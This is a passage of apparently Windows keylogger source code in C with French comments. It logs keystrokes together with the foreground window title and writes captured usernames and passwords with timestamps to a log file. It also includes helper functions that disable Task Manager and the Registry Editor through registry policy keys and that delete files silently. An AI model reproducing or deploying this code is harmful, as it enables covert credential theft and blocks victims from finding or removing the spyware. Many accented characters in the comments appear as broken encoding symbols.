               /* Sauvegarde de la touche actuelle */
               historiqueKey[key] = 1;
               
           } // Sortie du 1er if
           
           /* Raffraichissement de l'historique des touches */
           if(historiqueKey[key] == 1 && !GetAsyncKeyState(key)) /* Si la touche n'est plus enfonc�e */
              historiqueKey[key] = 0;
            
        } // Sortie du For
        
        hCurrent = GetForegroundWindow(); /* Handle de la fen�tre actuelle */
        GetWindowText(hCurrent, nomFenetre, MAX_FENETRE_TAILLE); /* Nom de la fen�tre actuelle */
        
   } // Sortie du While()
   
   
   SYSTEMTIME Time;
   GetSystemTime(&Time); /* On r�cup�re le temp */
   if (STOP || (lstrlen(pass) >= MINI_LEN_PASS)) /* Si on est sorti de la boucle normalement || changement de page on v�rifie le pass */
      sprintf(log, "=> %02d:%02d : [%s] <User> : %s <Pass> : %s\n", Time.wHour, Time.wMinute, fenetre, user, pass);
   else
   {
      if (lstrlen(user) >= MINI_LEN_USER)
         sprintf(log, "=> %02d:%02d : [%s] <User> : %s <Pass> : %s... [Failed to get%spassword]\n", Time.wHour, Time.wMinute, fenetre, user, pass, (lstrlen(pass) > 0) ? " full " : " ");
      else
         sprintf(log, "=> %02d:%02d : [%s] <User> : %s... <Pass> : %s... [Failed to get%suser/password]\n", Time.wHour, Time.wMinute, fenetre, user, pass, (lstrlen(user) > 0) ? " full " : " ");
   }
   
   if (MUST_RESET_LOG)
   {
      //si jamais le fichier est cach�/system ou en lecture seule
      char buffer[200];
      sprintf(buffer, "%s\\%s", FILES_PATH, NOM_LOG_FILE);
      SetFileAttributes(buffer, FILE_ATTRIBUTE_NORMAL);
      ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, log, 1);
      MUST_RESET_LOG = FALSE;
   }
   else
      ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, log, 0); /* On enregistre tout dans le fichier Log */
   
   free(user);
   free(pass);
}

//=============================================================================
//          Fonction qui recherche une chaine dans une autre
//
// @ retourne TRUE si trouv�
// @ retourne FALSE si pas trouv�
// @ Cette fonction est beaucoup plus mieu que strstr() qui ne fontionne pas
//   parfois
//=============================================================================

BOOL rechercherChaineDansChaine(char *chaine1, char *chaine2)
{
   /* R�cup�ration des longueurs des chaines */
   unsigned int chaine1_taille = lstrlen(chaine1);
   unsigned int chaine2_taille = lstrlen(chaine2);
   int i, j, save;
   
   for (i = 0; i < chaine1_taille; i++) /* Recherche de chaine2 dans chaine1 */
   {
      if (chaine1[i] == chaine2[0]) /* Si premier caract�re de chaine2 trouv� */
      {
         if (chaine2_taille == 1) /* Si le texte recherch� a d�j� �t� trouv� (vu qu'il ne contient qu'un seul caract�re) */
            return TRUE; /* trouv� */
         save = i;
         for (j = 1; j < chaine2_taille && i < chaine1_taille-1; j++) /* On cherche les autres caract�res */
         {
            i++;
            if (chaine2[j] != chaine1[i]) /* Si caract�re diff�rent (ce n'est pas le texte recherch�) */
            {
               i = save;
               break;                        
            }
            else if (j == chaine2_taille-1)
               return TRUE; /* trouv� */
         } // FIN 2EME FOR
      } // FIN IF
   } // FIN 1ER FOR
   
   return FALSE; /* pas trouv� */
}

//=============================================================================
//          Fonction qui extrait/modifie le nom d'un processus donn�
//=============================================================================

void extractProcessusNameFrom(char *nomProcessus)
{
     char nom[64];
     int i;
         
     /* Extraction du nom depuis le nom du processus */
     for (i=0; i<strlen(nomProcessus)-4; i++) /* -4 => .exe (4 caract�res) */
        nom[i] = nomProcessus[i];
         
     nom[i] = '\0';
     
     /* Application des modifications apr�s extraction */
     lstrcpy(nomProcessus, nom);
}

//=============================================================================
//                Fonction qui �crase le fichier sp�cifi�
//=============================================================================

BOOL ecraserFichier(char *path, char *nomFichier)
{
    char lpFichier[MAX_PATH], pathTo[2] = "";
    sprintf(lpFichier, "%s\\%s", path, nomFichier);
    lpFichier[strlen(lpFichier) + 1] = 0; // require double terminated
    pathTo[1] = 0; // require double terminated
    
    /* structure de configuration de l'op�ration sur le fichier */
    SHFILEOPSTRUCT structure_ecraser_fichier;
    structure_ecraser_fichier.hwnd = NULL;
    structure_ecraser_fichier.wFunc = FO_DELETE;
    // on �crase le fichier
    structure_ecraser_fichier.pFrom = lpFichier;
    structure_ecraser_fichier.pTo = pathTo;
    structure_ecraser_fichier.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;
    structure_ecraser_fichier.fAnyOperationsAborted = FALSE;
    structure_ecraser_fichier.hNameMappings = NULL;
    structure_ecraser_fichier.lpszProgressTitle = "";
    BOOL resultat = SHFileOperation(&structure_ecraser_fichier);
    
    return resultat;
}

//=============================================================================
//  Fonction qui renvoie le nombre d'occurence d'un caractere dans une chaine
//=============================================================================

int strCharOccur(char *chaine, char caractere)
{
    int occurence = 0, i;
    
    for (i = 0; i < strlen(chaine); i++)
    {
        if (chaine[i] == caractere)
           occurence++;
    }
    
    return occurence;
}

//=============================================================================
//  Fonction qui permet d'activer ou de d�sactiver le Gestionnaire des t�ches 
//=============================================================================

int setTaskManager(BOOL taskManagerState)
{
    // On active/d�sactive le Gestionnaire de t�ches depuis le registre
    return ajouterModifierRegistre("CREER",
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                                   HKEY_CURRENT_USER,
                                   "DisableTaskmgr",
                                   REG_DWORD,
                                   taskManagerState == ON ? "0" : "1"); // DisableTaskMgr == 1 => OFF
}

//=============================================================================
//   Fonction qui permet d'activer ou de d�sactiver l'�diteur de registre
//=============================================================================

int setRegistryEditor(BOOL state)
{
    // On active/d�sactive l'�diteur de registre
    return ajouterModifierRegistre("CREER",
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                                   HKEY_CURRENT_USER,
                                   "DisableRegistryTools",
                                   REG_DWORD,
                                   state == ON ? "0" : "1"); // DisableRegistryTools == 1 => OFF
}

//=============================================================================
//   Fonction qui v�rifie si le chemin pass� en param�tre est un fichier
//=============================================================================

BOOL is_file(const char* path) {
    struct stat buf;
    stat(path, &buf);
    return S_ISREG(buf.st_mode);
}

//=============================================================================
//   Fonction qui v�rifie si le chemin pass� en param�tre est un dossier
//=============================================================================

BOOL is_dir(const char* path) {
    struct stat buf;
    stat(path, &buf);
    return S_ISDIR(buf.st_mode);
}
